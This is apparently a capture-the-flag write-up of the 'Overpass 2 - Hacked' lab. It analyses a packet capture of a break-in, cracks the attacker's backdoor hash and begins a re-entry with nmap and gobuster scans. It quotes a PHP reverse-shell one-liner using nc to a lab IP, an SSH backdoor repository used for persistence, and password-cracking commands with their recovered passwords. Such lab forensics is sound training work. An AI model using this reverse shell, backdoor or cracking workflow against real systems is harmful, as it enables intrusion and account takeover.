# Overpass 2 - Hacked
* SOC team noticed suspicious activity on late night shift.
* Packets captured as attack happened.
## Forensics - Analyse the PCAP
1. What was the URL of the page they used to upload a reverse shell?
   * Follow TCP Stream (`tcp.stream eq 1`).
```
POST /development/upload.php HTTP/1.1
```
2. What payload did the attacker use to gain access?
   * Follow TCP Stream (`tcp.stream eq 1`).
```
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
3. What password did the attacker use to privesc?
   * Follow TCP Stream (`tcp.stream eq 3`).
```
[sudo] password for james: whenevernoteartinstant
```
4. How did the attacker establish persistence?
   * Follow TCP Stream (`tcp.stream eq 3`).
```
git clone https://github.com/NinjaJc01/ssh-backdoor
```
5. Using the fasttrack wordlist, how many of the system passwords were crackable?
   1. Copy and paste exposed shadow file from PCAP `tcp.stream eq3` into "shadow" file.
   2. Run JtR against shadowfile.
```
john --wordlist=/usr/share/wordlists/fasttrack.txt shadow
[...snip...]
secret12         (bee)     
abcd123          (szymex)     
1qaz2wsx         (muirland)     
secuirty3        (paradox)
[...snip...]
```
## Research - Analyse the code
1. What's the default hash for the backdoor?
   * [ssh-backdoor GitHub respository](https://github.com/NinjaJc01/ssh-backdoor) lists hash within "hash" variable in "main.go" code.
3. What's the hardcoded salt for the backdoor?
   * [ssh-backdoor GitHub respository](https://github.com/NinjaJc01/ssh-backdoor) lists salt within "passwordHandler" function in "main.go" code.
5. What was the hash that the attacker used? - go back to the PCAP for this!
   * Follow TCP Stream (`tcp.stream eq 3`).
```
james@overpass-production:~/ssh-backdoor$ ./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```
7. Crack the hash using rockyou and a cracking tool of your choice. What's the password?
* Copy and paste hash into "hash" file.
  * Suffix the hash with `:` then the salt.
* "ssh-backdoor" backdoor has "hashPassword" function within "main.go" code shows hashing algorithm is salted SHA512.
```
func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}
```
* Search for SHA512 password+hash format on [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes).
```
1710 	sha512($pass.$salt) 
```
* Run hashcat against hash.
  * `-m` specifies the hash type.
  * `-a` specifies the attack type.
    * `0` is straight attack type. 
```
hashcat -m 1710 -a 0 hash /usr/share/wordlists/rockyou.txt

[...snip...]
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1710 (sha512($pass.$salt))
Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
Time.Started.....: Tue Mar  5 16:48:43 2024 (1 sec)
Time.Estimated...: Tue Mar  5 16:48:44 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   228.0 kH/s (0.06ms) @ Accel:59 Loops:1 Thr:1 Vec:2
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 17228/14344385 (0.12%)
Rejected.........: 0/17228 (0.00%)
Restore.Point....: 16992/14344385 (0.12%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: yomisma -> october19
Hardware.Mon.#1..: Util: 21%

Started: Tue Mar  5 16:48:25 2024
Stopped: Tue Mar  5 16:48:45 2024
```
## Attack - Get back in!
* Paradox needs someone to take control of the Overpass production server again.
* There's flags on the box that Overpass can't afford to lose by formatting the server!
2. What's the user flag?
3. What's the root flag?

### Nmap scan
```
nmap -Pn -sC -p- -sV -oN TARGET_IP_scan.nmap TARGET_IP

map scan report for 10.10.75.252                                                                                         
Host is up (0.026s latency).                                                                                             
Not shown: 65532 closed tcp ports (conn-refused)                                                                         
PORT     STATE SERVICE VERSION                                                                                           
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                      
| ssh-hostkey:                                                                                                           
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)                                                           
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)                                                          
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)                                                        
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                    
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                             
|_http-title: LOL Hacked                                                                                                 
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)                                                             
| ssh-hostkey:                                                                                                           
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)                                                           
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Detect hidden directories using GoBuster
```
gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt > gobuster.txt

/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/aboutus              (Status: 301) [Size: 314] [--> http://10.10.75.252/aboutus/]
/.htaccess            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.75.252/css/]
/downloads            (Status: 301) [Size: 316] [--> http://10.10.75.252/downloads/]
/img                  (Status: 301) [Size: 310] [--> http://10.10.75.252/img/]
/index.html           (Status: 200) [Size: 815]
/server-status        (Status: 403) [Size: 277]
```
### Browse to webserver on port 80
1. The attacker defaced the website. What message did they leave as a heading - "H4ck3d by CooctusClan"

